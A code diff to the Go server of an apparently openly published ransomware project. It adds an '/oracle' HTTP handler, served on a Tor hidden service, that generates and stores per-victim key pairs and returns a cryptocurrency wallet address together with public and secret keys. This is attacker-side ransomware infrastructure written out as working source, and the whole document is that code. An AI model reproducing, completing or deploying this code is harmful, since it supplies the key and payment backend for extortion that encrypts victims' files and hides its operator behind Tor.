@@ -1,14 +1,18 @@
 package main
 
 import (
+    "io"
     "os"
     "log"
     "net/http"
+    "encoding/binary"
 
     "github.com/julienschmidt/httprouter"
     "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/crypto/scheme/attacker"
 )
+
+var scheme *attacker.Scheme
 
 func main() {
     go setup()
@@ -27,9 +31,12 @@ func setup() {
     }
     defer tor.Close()
 
+    // instantiate the crypto scheme
+    scheme = attacker.NewScheme()
+
     // http router config
     router := httprouter.New()
-    router.Handler("GET", "/oracle", attacker.NewOracle())
+    router.GET("/oracle", handleOracle)
 
     // start server
     log.Println("Listening on localhost at :9999 and :80 on the hidden service")
@@ -42,4 +49,28 @@ func loggingMiddleware(next http.Handler) http.Handler {
         next.ServeHTTP(w, r)
     }
     return http.HandlerFunc(handler)
+}
+
+func handleOracle(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
+    keys, err := scheme.GenerateAndStoreKeys()
+    if err != nil {
+        http.Error(w, err.Error(), http.StatusInternalServerError)
+        return
+    }
+
+    w.Header().Set("Content-Disposition", `attachment; filename="keys.bin"`)
+
+    // write wallet addr
+    io.WriteString(w, keys.Wallet)
+
+    // write keys
+    var size int64
+
+    size = int64(len(keys.Public))
+    binary.Write(w, binary.BigEndian, &size)
+    w.Write(keys.Public)
+
+    size = int64(len(keys.Secret))
+    binary.Write(w, binary.BigEndian, &size)
+    w.Write(keys.Secret)
 }
